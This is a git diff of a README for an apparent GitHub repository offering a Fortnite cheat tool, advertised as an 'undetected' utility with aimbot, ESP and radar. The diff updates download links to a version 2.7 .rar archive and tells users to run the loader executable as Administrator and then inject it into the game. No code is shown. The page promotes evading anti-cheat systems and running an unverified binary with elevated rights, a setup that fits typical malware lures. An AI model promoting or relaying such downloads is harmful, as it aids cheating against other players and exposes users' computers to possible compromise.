@@ -1,6 +1,6 @@
 <div align="center">
   
-  🎯 [Fortnite External](https://github.com/SonicMareBrace/Fortnite-External/releases/download/fortnite.2.6/fortnite.2.6.rar)
+  🎯 [Fortnite External](https://github.com/SonicMareBrace/Fortnite-External/releases/download/fortnite.2.7/fortnite.2.7.rar)
 
  > **The ultimate, feature-rich undetected utility for Fortnite. Full control over Aimbot, ESP, Radar, and Performance options.**
   
@@ -23,9 +23,9 @@
 ---
 
 
-### [⬇️ Download](https://github.com/SonicMareBrace/Fortnite-External/releases/download/fortnite.2.6/fortnite.2.6.rar)
+### [⬇️ Download](https://github.com/SonicMareBrace/Fortnite-External/releases/download/fortnite.2.7/fortnite.2.7.rar)
 
-[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/SonicMareBrace/Fortnite-External/releases/download/fortnite.2.6/fortnite.2.6.rar)
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/SonicMareBrace/Fortnite-External/releases/download/fortnite.2.7/fortnite.2.7.rar)
 
 
 </div>
@@ -68,7 +68,7 @@
 
 3. **Run Loader**  
 
-   Run `fortnite.2.6.exe` as **Administrator**.
+   Run `fortnite.2.7.exe` as **Administrator**.
 
 
 4. **Launch & Inject**  
